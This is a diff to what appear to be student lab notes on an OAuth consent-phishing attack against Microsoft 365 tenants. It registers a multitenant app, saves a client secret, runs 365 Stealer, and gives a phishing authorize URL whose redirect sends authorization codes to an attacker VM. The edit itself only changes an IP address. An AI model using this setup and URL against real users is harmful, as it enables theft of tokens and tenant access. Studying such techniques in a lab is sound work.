@@ -336,7 +336,7 @@ Ok now we are ready to set the trap!
 - Click Microsoft Entra ID > Manage > App registrations - New registrations
   - Create an app called Student213_App
   - Accounts in Multitenant
-  - Redirect URI (Web) to our attacker VM - https://171.36.151.213/login/authorized
+  - Redirect URI (Web) to our attacker VM - https://171.36.152.213/login/authorized
   - goto certificates and secrets and create a Client Secret - a client secret allows you to access the tenant as an application
   - **SAVE CLIENT SECRET!!!**: 
 ```
@@ -366,7 +366,7 @@ https://171.36.152.213/login/authorized
 - run 365 stealer
 - this has now provided us with the phishing URL we need for later:
 ```
-https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.151.213%2Flogin%2Fauthorized&response_mode=query
+https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=9e10a3bc-7cfa-407c-8ec9-8b04a3f2cd45&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F171.36.152.213%2Flogin%2Fauthorized&response_mode=query
 ```
 
 
